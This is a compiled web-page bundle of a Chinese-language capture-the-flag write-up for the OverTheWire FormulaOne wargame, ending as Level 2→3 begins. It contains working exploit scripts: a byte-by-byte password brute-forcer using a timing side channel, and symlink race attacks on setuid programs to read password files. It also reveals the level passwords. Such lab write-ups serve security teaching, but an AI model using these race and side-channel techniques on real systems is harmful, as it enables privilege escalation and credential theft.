"use strict";(self.webpackChunktarget_machines_write_up=self.webpackChunktarget_machines_write_up||[]).push([[3717],{44137:(n,e,r)=>{r.r(e),r.d(e,{assets:()=>t,contentTitle:()=>l,default:()=>m,frontMatter:()=>o,metadata:()=>s,toc:()=>c});const s=JSON.parse('{"id":"Independent-Environment/OverTheWire/FormulaOne/index","title":"FormulaOne","description":"FormulaOne \u662f\u4e00\u6b3e\u4ece intruded.net \u5d29\u6e83\u4e2d\u89e3\u6551\u51fa\u6765\u7684\u6218\u4e89\u6e38\u620f\uff0c\u4e4b\u524d\u6258\u7ba1\u5728 formulaone.intruded.net\u3002","source":"@site/docs/Independent-Environment/OverTheWire/FormulaOne/index.md","sourceDirName":"Independent-Environment/OverTheWire/FormulaOne","slug":"/Independent-Environment/OverTheWire/FormulaOne/","permalink":"/Target-Machines-WriteUp/docs/Independent-Environment/OverTheWire/FormulaOne/","draft":false,"unlisted":false,"editUrl":"https://github.com/TryHackMyOffsecBox/Target-Machines-WriteUp/edit/main/docs/Independent-Environment/OverTheWire/FormulaOne/index.md","tags":[],"version":"current","frontMatter":{},"sidebar":"Independent_Environment_Sidebar","previous":{"title":"Bandit","permalink":"/Target-Machines-WriteUp/docs/Independent-Environment/OverTheWire/Bandit/"},"next":{"title":"Leviathan","permalink":"/Target-Machines-WriteUp/docs/Independent-Environment/OverTheWire/Leviathan/"}}');var a=r(74848),i=r(28453);const o={},l="FormulaOne",t={},c=[{value:"First of all",id:"first-of-all",level:2},{value:"Level 0",id:"level-0",level:2},{value:"Level 0 -&gt; Level 1",id:"level-0---level-1",level:2},{value:"Level 1 -&gt; Level 2",id:"level-1---level-2",level:2},{value:"Level 2 -&gt; Level 3",id:"level-2---level-3",level:2},{value:"Level 3 -&gt; Level 5",id:"level-3---level-5",level:2}];function d(n){const e={admonition:"admonition",code:"code",h1:"h1",h2:"h2",header:"header",img:"img",p:"p",pre:"pre",...(0,i.R)(),...n.components};return(0,a.jsxs)(a.Fragment,{children:[(0,a.jsx)(e.header,{children:(0,a.jsx)(e.h1,{id:"formulaone",children:"FormulaOne"})}),"\n",(0,a.jsxs)(e.admonition,{type:"info",children:[(0,a.jsxs)(e.p,{children:[(0,a.jsx)(e.code,{children:"FormulaOne"})," \u662f\u4e00\u6b3e\u4ece ",(0,a.jsx)(e.code,{children:"intruded.net"})," \u5d29\u6e83\u4e2d\u89e3\u6551\u51fa\u6765\u7684\u6218\u4e89\u6e38\u620f\uff0c\u4e4b\u524d\u6258\u7ba1\u5728 ",(0,a.jsx)(e.code,{children:"formulaone.intruded.net"}),"\u3002"]}),(0,a.jsxs)(e.p,{children:[(0,a.jsx)(e.code,{children:"FormulaOne"})," \u7684\u5173\u5361\u5206\u522b\u79f0\u4e3a ",(0,a.jsx)(e.code,{children:"formulaone0"}),"\u3001",(0,a.jsx)(e.code,{children:"formulaone1"}),"\u3001...... \u7b49\uff0c\u53ef\u901a\u8fc7 SSH \u5728\u7aef\u53e3 2232 \u4e0a\u8bbf\u95ee ",(0,a.jsx)(e.code,{children:"formulaone.labs.overthewire.org"}),"\u3002"]}),(0,a.jsxs)(e.p,{children:["\u5173\u5361\u7684\u6570\u636e\u53ef\u5728 ",(0,a.jsx)(e.code,{children:"/formulaone/"})," \u4e2d\u627e\u5230\u3002"]}),(0,a.jsx)(e.p,{children:"\u7b2c\u4e00\u4e2a\u5173\u5361\u7684\u6e90\u4ee3\u7801\u53ef\u4ee5\u901a\u8fc7\u767b\u5f55\u6258\u7ba1\u5728\u540c\u4e00\u670d\u52a1\u5668\u4e0a\u7684\u6218\u4e89\u6e38\u620f\u6765\u8bbf\u95ee\u3002 \u4f60\u7684\u9996\u8981\u4efb\u52a1\u662f\u627e\u51fa\u662f\u54ea\u4e2a\u6218\u4e89\u6e38\u620f\u3002"})]}),"\n",(0,a.jsx)(e.h2,{id:"first-of-all",children:"First of all"}),"\n",(0,a.jsxs)(e.p,{children:["\u9996\u5148\uff0c\u53ef\u4ee5\u5728 ",(0,a.jsx)(e.code,{children:"Bandit"})," \u8fd9\u90e8\u5206 wargame \u4e2d\u627e\u5230 ",(0,a.jsx)(e.code,{children:"FormulaOne"})," \u7684\u8d44\u6e90"]}),"\n",(0,a.jsx)(e.pre,{children:(0,a.jsx)(e.code,{className:"language-shell",children:"bandit1@bandit:~$ hostnamectl\n Static hostname: bandit\n       Icon name: computer-vm\n         Chassis: vm \ud83d\uddb4\n      Machine ID: ec2dd69f90c4a6285216f71caca9bbca\n         Boot ID: d0128cdc32f74d7fb3595d0dbaee5368\n  Virtualization: amazon\nOperating System: Ubuntu 24.04.1 LTS\n          Kernel: Linux 6.8.0-1014-aws\n    Architecture: x86-64\n Hardware Vendor: Amazon EC2\n  Hardware Model: t3.medium\nFirmware Version: 1.0\n   Firmware Date: Mon 2017-10-16\n    Firmware Age: 7y 2month 2w 5d\nbandit1@bandit:~$ whoami\nbandit1\nbandit1@bandit:~$ ls -lh / | grep formulaone\ndrwxr-xr-x   3 root root 4.0K Sep 19 07:09 formulaone\nbandit1@bandit:~$ ls -lh /formulaone\ntotal 136K\n-rwxr-x--- 1 formulaone0 formulaone0  16K Sep 19 07:09 formulaone0\n-rwxr-xr-x 1 formulaone0 formulaone0 1.9K Sep 19 07:09 formulaone0.c\n-rwsr-x--- 1 formulaone1 formulaone0  15K Sep 19 07:09 formulaone1\n-rwxr-x--- 1 formulaone1 formulaone0  365 Sep 19 07:09 formulaone1.c\n-rwsr-x--- 1 formulaone2 formulaone1  15K Sep 19 07:09 formulaone2\ndrwxr-xr-x 2 root        root        4.0K Sep 19 07:09 formulaone2_src\n-rwsr-x--- 1 formulaone3 formulaone2  15K Sep 19 07:09 formulaone3\n-rwxr-x--- 1 formulaone3 formulaone2  729 Sep 19 07:09 formulaone3.c\n-rwsr-x--- 1 formulaone3 formulaone2  15K Sep 19 07:09 formulaone3-hard\n-rwsr-x--- 1 formulaone5 formulaone3  16K Sep 19 07:09 formulaone5\n-rwxr-x--- 1 formulaone5 formulaone3 2.1K Sep 19 07:09 formulaone5.c\n-rwsr-x--- 1 formulaone6 formulaone5  15K Sep 19 07:09 formulaone6\n-rwxr-x--- 1 formulaone6 formulaone5  657 Sep 19 07:09 formulaone6.c\n"})}),"\n",(0,a.jsx)(e.h2,{id:"level-0",children:"Level 0"}),"\n",(0,a.jsx)(e.p,{children:"\u63d0\u4f9b\u4e86\u4e00\u4efd C \u8bed\u8a00\u4ee3\u7801"}),"\n",(0,a.jsx)(e.pre,{children:(0,a.jsx)(e.code,{className:"language-c",metastring:'title="/formulaone/formulaone0.c"',children:'#include <stdio.h>\n#include <sys/socket.h>\n#include <arpa/inet.h>\n#include <netdb.h>\n#include <string.h>\n#include <unistd.h>\n#include <stdlib.h>\n#include <signal.h>\n\n#define PORT 4091\n\nint createsocket(int portno)\n{\n    int yes = 1;\n    struct sockaddr_in addr;\n    bzero(&addr, sizeof(addr));\n    addr.sin_family = AF_INET;\n    addr.sin_addr.s_addr = INADDR_ANY;\n    addr.sin_port = htons(portno);\n\n    int sock = socket(AF_INET, SOCK_STREAM, 0);\n    if (sock < 0)\n    {\n        perror("open socket failed");\n        return -1;\n    }\n\n    setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(int));\n\n    if (bind(sock, (struct sockaddr *)&addr, sizeof(addr)) < 0)\n    {\n        perror("bind failed");\n        close(sock);\n        return -1;\n    }\n\n    if (listen(sock, 5) < 0)\n    {\n        perror("listen failed");\n        close(sock);\n        return -1;\n    }\n\n    return sock;\n}\n\nint read_byte(int fd)\n{\n    int ret;\n    char buf = 0;\n    //  sleep(1);\n    ret = recv(fd, &buf, 1, 0);\n    if (ret == 0)\n    {\n        printf("RECV FAIL :(\\n");\n        return -1;\n    }\n    if (ret < 0)\n        return 0;\n\n    return buf & 0xff;\n}\n\n#ifndef PASSWD\n#define PASSWD "s3cret"\n#endif\n\nvoid client(int fd)\n{\n    int i = 0;\n\n    send(fd, "Password:", 10, 0);\n    for (i = 0; i < strlen(PASSWD); i++)\n    {\n        if (PASSWD[i] != read_byte(fd))\n        {\n            break;\n        }\n    }\n\n    if (i != strlen(PASSWD))\n    {\n        send(fd, "WRONG PASSWORD\\n", 15, 0);\n        close(fd);\n    }\n    else\n    {\n        dup2(fd, 0);\n        dup2(fd, 1);\n        dup2(fd, 2);\n\n        system("/bin/sh");\n        printf("system just closed\\n");\n    }\n    return;\n}\n\nint main()\n{\n    int fd;\n    int n;\n    struct sockaddr_in addr;\n    socklen_t addrlen = sizeof(addr);\n\n    signal(SIGCHLD, SIG_IGN);\n\n    fd = createsocket(PORT);\n\n    while (1)\n    {\n        n = accept(fd, (struct sockaddr *)&addr, &addrlen);\n        //    printf("[+] Connection from %s\\n", inet_ntoa(addr.sin_addr));\n        if (fork() == 0)\n        {\n            close(fd);\n            client(n);\n            exit(0);\n        }\n        else\n        {\n            close(n);\n        }\n    }\n}\n'})}),"\n",(0,a.jsxs)(e.p,{children:["\u7b80\u5355\u7406\u89e3\u4e00\u4e0b\uff0c\u5c31\u662f\u4ee3\u7801\u4e2d\u786c\u7f16\u7801\u4e86\u4e00\u4e2a ",(0,a.jsx)(e.code,{children:"PASSWD"})," \u5b57\u7b26\u4e32\u4f5c\u4e3a\u8fde\u63a5\u5bc6\u7801\uff0c\u5982\u679c\u7528\u6237\u6709\u8fd9\u4e2a\u5b57\u7b26\u4e32\uff0c\u90a3\u4e48\u76f4\u63a5\u8fde\u63a5 ",(0,a.jsx)(e.code,{children:"4091"})," \u8fd9\u4e2a\u7aef\u53e3\uff0c\u8f93\u5165\u5bc6\u7801\uff0c\u5373\u53ef\u4e0e ",(0,a.jsx)(e.code,{children:"/bin/sh"})," \u8fdb\u884c\u4ea4\u4e92"]}),"\n",(0,a.jsxs)(e.p,{children:["\u8fd9\u91cc\u4f1a\u6709\u4e00\u4e2a\u95ee\u9898\uff0c\u5c31\u662f\u63a5\u6536\u7528\u6237\u8f93\u5165\u662f\u901a\u8fc7 ",(0,a.jsx)(e.code,{children:"read_byte(fd)"})," \u6765\u5b9e\u73b0\u7684\uff0c\u90a3\u4e48\u5c31\u4f1a\u5bfc\u81f4\uff0c\u53ef\u4ee5\u5b9e\u73b0\u4fa7\u4fe1\u9053\u76f2\u6ce8"]}),"\n",(0,a.jsxs)(e.p,{children:["\u5982\u679c\u5728\u6309\u4e0b\u56de\u8f66\u4e4b\u524d\uff0c\u8f93\u5165\u7684\u5b57\u7b26\u4e0e ",(0,a.jsx)(e.code,{children:"PASSWD"})," \u4e00\u81f4\uff0c\u90a3\u4e48\u5c31\u4f1a\u5bfc\u81f4\uff1a\u8f93\u51fa ",(0,a.jsx)(e.code,{children:"WRONG PASSWORD"})," \u63d0\u793a\uff0c\u4f46\u662f socket \u4e0d\u4f1a\u76f4\u63a5\u5173\u95ed"]}),"\n",(0,a.jsx)(e.admonition,{type:"warning",children:(0,a.jsx)(e.p,{children:"\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u65e0\u6cd5\u5728\u8fdc\u7a0b\u76f4\u63a5\u5b9e\u73b0\u8fd9\u4e00\u90e8\u5206\uff0c\u9700\u8981\u5728\u5176\u4ed6\u4efb\u610f\u540c\u4e3b\u673a\u7684 wargame \u73af\u5883\u4e2d\u8fdb\u884c\u6d4b\u8bd5"})}),"\n",(0,a.jsxs)(e.p,{children:["\u7531\u4e8e\u76f4\u63a5\u64cd\u4f5c socket \u4f1a\u8bdd\u5b58\u5728\u4e00\u5b9a\u96be\u5ea6\uff0c\u6240\u4ee5\u76f4\u63a5\u64cd\u4f5c ",(0,a.jsx)(e.code,{children:"nc"})," \u5373\u53ef"]}),"\n",(0,a.jsx)(e.pre,{children:(0,a.jsx)(e.code,{className:"language-python",children:'import subprocess\nimport time\nimport string\n\n\ndef check_password_with_nc(host, port, password):\n    try:\n        # \u542f\u52a8 netcat \u8fdb\u7a0b\n        process = subprocess.Popen(\n            ["nc", host, str(port)],  # \u542f\u52a8 nc\n            stdin=subprocess.PIPE,  # \u6807\u51c6\u8f93\u5165\n            stdout=subprocess.PIPE,  # \u6807\u51c6\u8f93\u51fa\n            stderr=subprocess.PIPE,  # \u6807\u51c6\u9519\u8bef\n            text=True,  # \u6587\u672c\u6a21\u5f0f\u5904\u7406\n        )\n\n        # \u8bfb\u53d6\u521d\u59cb\u63d0\u793a\uff0c\u6bd4\u5982 "Password:"\n        try:\n            prompt = process.stdout.read(9)  # \u5047\u8bbe\u63d0\u793a\u4e3a\u56fa\u5b9a\u957f\u5ea6\n            # print(f"Netcat prompt: {prompt.strip()}")\n        except Exception as e:\n            print(f"Failed to read prompt: {e}")\n            process.terminate()\n            return False\n\n        # \u53d1\u9001\u5bc6\u7801\n        process.stdin.write(password + "\\n")  # \u53d1\u9001\u5bc6\u7801\u5e76\u6362\u884c\n        process.stdin.flush()  # \u786e\u4fdd\u7acb\u5373\u53d1\u9001\u6570\u636e\n\n        # \u7b49\u5f85\u4e00\u5c0f\u6bb5\u65f6\u95f4\uff0c\u68c0\u67e5\u8fdb\u7a0b\u662f\u5426\u9000\u51fa\n        time.sleep(0.2)  # \u7ed9 nc \u4e00\u70b9\u65f6\u95f4\u5904\u7406\u5bc6\u7801\n        if process.poll() is not None:  # \u5982\u679c\u8fdb\u7a0b\u5df2\u9000\u51fa\n            return False\n        else:\n            return True\n\n    except Exception as e:\n        print(f"An error occurred: {e}")\n        return False\n\n    finally:\n        # \u786e\u4fdd\u8fdb\u7a0b\u88ab\u7ec8\u6b62\uff08\u5373\u4f7f\u5bc6\u7801\u6b63\u786e\uff09\n        if process.poll() is None:  # \u5982\u679c\u8fdb\u7a0b\u4ecd\u5728\u8fd0\u884c\n            process.terminate()  # \u7ec8\u6b62\u8fdb\u7a0b\n\n\n# \u793a\u4f8b\u4f7f\u7528\nif __name__ == "__main__":\n    host = "127.0.0.1"\n    port = 4091\n\n    dics = string.digits + string.ascii_letters\n    passwd = ""\n\n    while True:\n        for i in dics:\n\n            pwd = passwd + i\n            print(f"[+]Trying -> {pwd}")\n\n            is_correct = check_password_with_nc(host, port, pwd)\n\n            if is_correct:\n                print(f">>> Password {pwd} is correct! <<<")\n                passwd += i\n                break\n            else:\n                continue\n'})}),"\n",(0,a.jsx)(e.p,{children:"\u5728\u4efb\u610f\u540c\u4e3b\u673a wargame \u4e2d\u8fd0\u884c\u6b64\u811a\u672c\uff0c\u6700\u7ec8\u7ed3\u679c\u4f1a\u663e\u793a\u4e3a"}),"\n",(0,a.jsx)(e.p,{children:(0,a.jsx)(e.img,{alt:"img",src:r(78039).A+"",width:"1134",height:"1196"})}),"\n",(0,a.jsxs)(e.p,{children:["\u5373\u53ef\u786e\u5b9a\u6700\u7ec8\u7684\u5bc6\u7801\u4e3a ",(0,a.jsx)(e.code,{children:"2w9lMSElHLSu6PigGsugLYdKiLV9BH84"})]}),"\n",(0,a.jsx)(e.h2,{id:"level-0---level-1",children:"Level 0 -> Level 1"}),"\n",(0,a.jsxs)(e.p,{children:["\u767b\u5f55 ",(0,a.jsx)(e.code,{children:"Level 0"})," \u8d26\u6237"]}),"\n",(0,a.jsx)(e.pre,{children:(0,a.jsx)(e.code,{className:"language-shell",children:"ssh formulaone0@formulaone.labs.overthewire.org -p 2232\n"})}),"\n",(0,a.jsxs)(e.p,{children:["\u5373\u53ef\u8fdb\u5165 ",(0,a.jsx)(e.code,{children:"formulaone0"})," \u7528\u6237"]}),"\n",(0,a.jsx)(e.pre,{children:(0,a.jsx)(e.code,{className:"language-shell",children:"formulaone0@bandit:~$ whoami\nformulaone0\n"})}),"\n",(0,a.jsx)(e.p,{children:"\u67e5\u770b\u672c\u5173\u7684\u6311\u6218"}),"\n",(0,a.jsx)(e.pre,{children:(0,a.jsx)(e.code,{className:"language-c",metastring:'title="/formulaone/formulaone1.c"',children:'#include <stdio.h>\n#include <stdlib.h>\n#include <unistd.h>\n#include <sys/types.h>\n#include <sys/stat.h>\n#include <fcntl.h>\n#include <string.h>\n\nint main(int argc, char **argv) {\n    if (access(argv[1], R_OK) < 0) return 1;\n    printf("Contents:\\n");\n    int f = open(argv[1], O_RDONLY);\n    if(f < 0) return 1;\n    char c;\n    while (read(f,&c,1)) write(1,&c,1);\n    return 0;\n}\n'})}),"\n",(0,a.jsx)(e.p,{children:"\u6709\u4e24\u5c42\u68c0\u67e5\uff0c\u4e00\u662f\u5f53\u524d\u7528\u6237\u662f\u5426\u5177\u6709\u8bbf\u95ee\u6743\u9650"}),"\n",(0,a.jsx)(e.pre,{children:(0,a.jsx)(e.code,{className:"language-c",children:"if (access(argv[1], R_OK) < 0) return 1;\n"})}),"\n",(0,a.jsxs)(e.p,{children:["\u4e8c\u662f\u5177\u6709 ",(0,a.jsx)(e.code,{children:"suid"})," \u6743\u9650\u7684\u524d\u63d0\u4e0b\uff0c\u6587\u4ef6\u662f\u5426\u53ef\u8bfb\u53d6"]}),"\n",(0,a.jsx)(e.pre,{children:(0,a.jsx)(e.code,{className:"language-c",children:"int f = open(argv[1], O_RDONLY);\n"})}),"\n",(0,a.jsxs)(e.p,{children:["\u7a0b\u5e8f\u4e2d\u95f4\u6267\u884c ",(0,a.jsx)(e.code,{children:"printf"})," \u4f1a\u5360\u7528\u4e00\u5b9a\u65f6\u95f4\uff0c\u5b58\u5728\u6709\u6761\u4ef6\u7ade\u4e89\u7684\u53ef\u80fd\u6027"]}),"\n",(0,a.jsx)(e.p,{children:"\u5c1d\u8bd5\u8fdb\u884c\u6761\u4ef6\u7ade\u4e89\uff0c\u542f\u52a8\u4e24\u4e2a SSH \u4f1a\u8bdd\uff0c\u5206\u522b\u6267\u884c\u4ee5\u4e0b\u4e24\u4e2a\u4f1a\u8bdd"}),"\n",(0,a.jsx)(e.pre,{children:(0,a.jsx)(e.code,{className:"language-shell",children:"for i in $(seq 100000);do /formulaone/formulaone1 /tmp/randark/12341;done\n\nfor i in $(seq 10000);do rm /tmp/randark/12341;echo 1234 > /tmp/randark/12341;rm /tmp/randark/12341;ln -sv /etc/formulaone_pass/formulaone1 /tmp/randark/12341;done\n"})}),"\n",(0,a.jsx)(e.p,{children:(0,a.jsx)(e.img,{alt:"img",src:r(63302).A+"",width:"2560",height:"1540"})}),"\n",(0,a.jsxs)(e.p,{children:["\u5373\u53ef\u786e\u5b9a\u6700\u7ec8\u7684\u5bc6\u7801\u4e3a ",(0,a.jsx)(e.code,{children:"WUJPXwIoiBhedmDZceQ5DAUMq0JeI0eU"})]}),"\n",(0,a.jsx)(e.h2,{id:"level-1---level-2",children:"Level 1 -> Level 2"}),"\n",(0,a.jsxs)(e.p,{children:["\u767b\u5f55 ",(0,a.jsx)(e.code,{children:"Level 1"})," \u8d26\u6237"]}),"\n",(0,a.jsx)(e.pre,{children:(0,a.jsx)(e.code,{className:"language-shell",children:"ssh formulaone1@formulaone.labs.overthewire.org -p 2232\n"})}),"\n",(0,a.jsx)(e.p,{children:"\u67e5\u770b\u672c\u8f6e\u6311\u6218"}),"\n",(0,a.jsx)(e.pre,{children:(0,a.jsx)(e.code,{className:"language-shell",children:"-rwsr-x--- 1 formulaone2 formulaone1  15K Sep 19 07:09 formulaone2\ndrwxr-xr-x 2 root        root        4.0K Sep 19 07:09 formulaone2_src\n"})}),"\n",(0,a.jsx)(e.pre,{children:(0,a.jsx)(e.code,{className:"language-c",metastring:'title="/formulaone/formulaone2_src/formulaone2.c"',children:'#include <stdio.h>\n\nint main(int argc, char *argv[]){\n    char buf[256];\n    FILE *f = fopen(mytmpnam(NULL),"r");\n    fgets(buf, sizeof(buf), f);\n    fwrite(buf, sizeof(buf), 1, stdout);\n    return;\n}\n'})}),"\n",(0,a.jsx)(e.pre,{children:(0,a.jsx)(e.code,{className:"language-c",metastring:'title="/formulaone/formulaone2_src/tmpnam.c"',children:'#include <stdio.h>\n#include <string.h>\n#include <sys/types.h>\n#include <sys/stat.h>\n#include <unistd.h>\n\n\n#define PREFIX "/tmp/tmp_"\n#define RNDLEN 4\n\nchar mytmpnam_buffer[100];\n\nchar *mytmpnam(char *s) {\n    int i, seed, result, prefixlen = strlen(PREFIX);\n    FILE *in;\n    struct stat st;\n\n    if(!(in = fopen("/dev/urandom", "r"))) return NULL;\n    fread(&seed, sizeof(seed), 1, in);\n    fclose(in);\n    srand(seed);\n\n    while(1) {\n        strcpy(mytmpnam_buffer, PREFIX);\n        for(i = prefixlen; i < prefixlen + RNDLEN; i++) {\n            mytmpnam_buffer[i] = \'a\' + (rand() % 26);\n        }\n        mytmpnam_buffer[i] = 0;\n\n        if(stat(mytmpnam_buffer, &st) != 0) return mytmpnam_buffer;\n    }\n\n    return NULL;\n}\n\n#ifdef MAIN\nvoid main() {\n   printf("%s\\n", mytmpnam(NULL));\n}\n#endif\n'})}),"\n",(0,a.jsxs)(e.p,{children:["\u5bf9\u4e8e ",(0,a.jsx)(e.code,{children:"mytmpnam"})," \u800c\u8a00\uff0c\u5176\u8d1f\u8d23\u57fa\u4e8e ",(0,a.jsx)(e.code,{children:"/tmp/tmp_????"})," \u63a9\u7801\u6765\u751f\u6210\u4e00\u4e2a\u6587\u4ef6\u540d\uff0c\u63a9\u7801\u7684\u5b57\u7b26\u8303\u56f4\u662f\u5c0f\u5199\u5b57\u6bcd"]}),"\n",(0,a.jsxs)(e.p,{children:["\u7ecf\u8fc7\u68c0\u67e5\uff0c\u7528\u6237 ",(0,a.jsx)(e.code,{children:"formulaone1"})," \u65e0\u6cd5\u5217\u51fa ",(0,a.jsx)(e.code,{children:"/tmp"})," \u76ee\u5f55\u4e0b\u7684\u6587\u4ef6\uff0c\u4f46\u662f\u53ef\u4ee5\u521b\u5efa\u6587\u4ef6\uff0c\u53ef\u4ee5\u8003\u8651\u8fdb\u884c\u5168\u90e8\u8986\u76d6"]}),"\n",(0,a.jsxs)(e.p,{children:["\u4f46\u662f ",(0,a.jsx)(e.code,{children:"mytmpnam"})," \u8fd4\u56de\u8def\u5f84\u7684\u6761\u4ef6\u662f\uff0c\u8fd9\u4e2a\u6587\u4ef6\u4e0d\u5b58\u5728\uff0c\u90a3\u4e48\u4f9d\u7136\u53ef\u4ee5\u8003\u8651\u7ade\u4e89\u6765\u5b9e\u73b0"]}),"\n",(0,a.jsxs)(e.p,{children:["\u90a3\u4e48\u76ee\u6807\u5c31\u53d8\u6210\uff0c\u5c06\u6240\u6709 ",(0,a.jsx)(e.code,{children:"/tmp/tmp_????"})," \u6587\u4ef6\u90fd\u5efa\u7acb\u6307\u5411 ",(0,a.jsx)(e.code,{children:"/etc/formulaone_pass/formulaone2"})," \u7684\u8f6f\u8fde\u63a5\uff0c\u7136\u540e\u518d\u5355\u72ec\u7559\u4e0b\u4e00\u4e2a\u6587\u4ef6\u4f5c\u4e3a\u4e0d\u5b58\u5728\u7684\u6587\u4ef6\uff0c\u7136\u540e\u5c1d\u8bd5\u8fdb\u884c\u7ade\u4e89"]}),"\n",(0,a.jsx)(e.p,{children:"\u5bf9\u4e8e Python \u800c\u8a00\uff0c\u53ef\u4ee5\u4f7f\u7528\u8fd9\u4efd\u811a\u672c"}),"\n",(0,a.jsx)(e.pre,{children:(0,a.jsx)(e.code,{className:"language-python",children:'import os\nfrom string import ascii_lowercase\n\ndef create_tmp(data: str):\n    for a1 in ascii_lowercase:\n        for a2 in ascii_lowercase:\n            for a3 in ascii_lowercase:\n                for a4 in ascii_lowercase:\n                    filename = "/tmp/tmp_" + a1 + a2 + a3 + a4\n                    with open(filename, "w") as f:\n                        f.write(data)\n        print(f"a1: {a1}")\n\n\ndef link_tmp(src_path: str):\n    for a1 in ascii_lowercase:\n        for a2 in ascii_lowercase:\n            for a3 in ascii_lowercase:\n                for a4 in ascii_lowercase:\n                    filename = "/tmp/tmp_" + a1 + a2 + a3 + a4\n                    os.symlink(src_path, filename)\n        print(f"a1: {a1}")\n\n\ndef clear_tmp():\n    for a1 in ascii_lowercase:\n        for a2 in ascii_lowercase:\n            for a3 in ascii_lowercase:\n                for a4 in ascii_lowercase:\n                    filename = "/tmp/tmp_" + a1 + a2 + a3 + a4\n                    os.remove(filename)\n        print(f"a1: {a1}")\n\n\nif __name__ == "__main__":\n    action = input("Enter action (create/clear/link):")\n    if action == "create":\n        src_path = input("File data:")\n        create_tmp(src_path)\n    if action == "link":\n        src_path = input("Enter source path:")\n        link_tmp(src_path)\n    elif action == "clear":\n        clear_tmp()\n    else:\n        print("Invalid action")\n'})}),"\n",(0,a.jsxs)(e.p,{children:["\u5148\u6267\u884c\u5168\u90e8\u6240\u6709 ",(0,a.jsx)(e.code,{children:"/tmp/tmp_????"})," \u6587\u4ef6\u90fd\u5efa\u7acb\u6307\u5411 ",(0,a.jsx)(e.code,{children:"/etc/formulaone_pass/formulaone2"})," \u7684\u8f6f\u8fde\u63a5"]}),"\n",(0,a.jsx)(e.pre,{children:(0,a.jsx)(e.code,{className:"language-shell",children:"formulaone1@bandit:/tmp/randark$ python3 formulaone2.py\nEnter action (create/clear/link): link\nEnter source path: /etc/formulaone_pass/formulaone2\na1: a\na1: b\na1: c\na1: d\na1: e\na1: f\na1: g\na1: h\na1: i\na1: j\na1: k\na1: l\na1: m\na1: n\na1: o\na1: p\na1: q\na1: r\na1: s\na1: t\na1: u\na1: v\na1: w\na1: x\na1: y\na1: z\n"})}),"\n",(0,a.jsx)(e.p,{children:"\u5efa\u7acb\u94fe\u63a5\u4e4b\u540e\uff0c\u8003\u8651\u5230\u7a0b\u5e8f\u7684\u53cd\u5e94\u65f6\u95f4\uff0c\u65e0\u6cd5\u4f7f\u7528 python \u811a\u672c\u6765\u5b9e\u73b0\u7ade\u4e89\uff0c\u90a3\u4e48\u7528 c \u6765\u5199\u4e00\u4e2a"}),"\n",(0,a.jsx)(e.pre,{children:(0,a.jsx)(e.code,{className:"language-c",children:'#include <stdio.h>\n#include <stdlib.h>\n#include <unistd.h>\n\nint main() {\n    while (1) {\n\n        // \u5220\u9664\u6587\u4ef6\n        if (unlink("/tmp/tmp_aaaa") == -1) {\n            perror("Error deleting /tmp/tmp_aaaa");\n        }\n\n        // \u521b\u5efa\u8f6f\u94fe\u63a5\n        if (symlink("/etc/formulaone_pass/formulaone2", "/tmp/tmp_aaaa") == -1) {\n            perror("Error creating symlink");\n        }\n\n    }\n\n    return 0;\n}\n'})}),"\n",(0,a.jsxs)(e.p,{children:["\u5176\u5c06\u4f1a\u5728\u8fd0\u884c\u671f\u95f4\u4e0d\u65ad\u53d6\u6d88 ",(0,a.jsx)(e.code,{children:"/tmp/tmp_aaaa"})," \u6587\u4ef6\u7684\u8f6f\u94fe\u63a5\uff0c\u5e76\u63a5\u7740\u5efa\u7acb ",(0,a.jsx)(e.code,{children:"/tmp/tmp_aaaa"})," \u6307\u5411 ",(0,a.jsx)(e.code,{children:"/etc/formulaone_pass/formulaone2"})," \u7684\u8f6f\u94fe\u63a5"]}),"\n",(0,a.jsxs)(e.p,{children:["\u5728\u5faa\u73af\u7684\u8fd0\u884c\u671f\u95f4\uff0c\u540c\u65f6\u6267\u884c ",(0,a.jsx)(e.code,{children:"/formulaone/formulaone2"})," \u7a0b\u5e8f\uff0c\u90a3\u4e48 ",(0,a.jsx)(e.code,{children:"mytmpnam"})," \u7684\u8fd0\u884c\u65f6\u95f4\u5dee\u4e0e\u7ade\u4e89\u7a0b\u5e8f\u7684\u8fd0\u884c\u65f6\u95f4\u5dee\u5c31\u6709\u53ef\u80fd\u4ea4\u9519\uff0c\u8fdb\u800c\u6ee1\u8db3 ",(0,a.jsx)(e.code,{children:"mytmpnam"})," \u7684\u5224\u65ad\u903b\u8f91"]}),"\n",(0,a.jsxs)(e.p,{children:["\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u7531\u4e8e ",(0,a.jsx)(e.code,{children:"mytmpnam"})," \u7684\u751f\u6210\u53ef\u80fd\u6027\u662f 26^4 \u79cd\uff0c\u6240\u4ee5\u7ade\u4e89\u7684\u53ef\u80fd\u6027\u8f83\u591a\uff0c\u9700\u8981\u7b49\u5f85\u4e00\u5b9a\u65f6\u95f4"]}),"\n",(0,a.jsx)(e.admonition,{type:"note",children:(0,a.jsxs)(e.p,{children:["\u5982\u679c\u60f3\u8981\u8ddf\u8e2a\u5224\u65ad ",(0,a.jsx)(e.code,{children:"/formulaone/formulaone2"})," \u7684\u8fd0\u884c\u8fc7\u7a0b\uff0c\u53ef\u4ee5\u4f7f\u7528 ",(0,a.jsx)(e.code,{children:"strace /formulaone/formulaone2"})," \u8fdb\u884c\u8ddf\u8e2a"]})}),"\n",(0,a.jsx)(e.p,{children:"\u5f00\u4e24\u4e2a SSH \u4f1a\u8bdd\uff0c\u5404\u81ea\u6267\u884c"}),"\n",(0,a.jsx)(e.pre,{children:(0,a.jsx)(e.code,{className:"language-shell",children:"# compiled from c code above\n./death\n\nfor i in $(seq 1000);do echo $i; /formulaone/formulaone2 ;done\n"})}),"\n",(0,a.jsx)(e.p,{children:"\u7406\u60f3\u60c5\u51b5\u4e0b\uff0c\u5e94\u8be5\u5728 10 \u6b21\u5faa\u73af\u5185\u6210\u529f\uff08\u7ade\u4e89\u770b\u8fd0\u6c14\uff09"}),"\n",(0,a.jsx)(e.p,{children:(0,a.jsx)(e.img,{alt:"img",src:r(52255).A+"",width:"2560",height:"1540"})}),"\n",(0,a.jsxs)(e.p,{children:["\u5373\u53ef\u786e\u5b9a\u6700\u7ec8\u7684\u5bc6\u7801\u4e3a ",(0,a.jsx)(e.code,{children:"OvQAKUM3BrvbH4pKjBJBCOUpTGSDjNum"})]}),"\n",(0,a.jsx)(e.h2,{id:"level-2---level-3",children:"Level 2 -> Level 3"}),"\n",(0,a.jsxs)(e.p,{children:["\u767b\u5f55 ",(0,a.jsx)(e.code,{children:"Level 2"})," 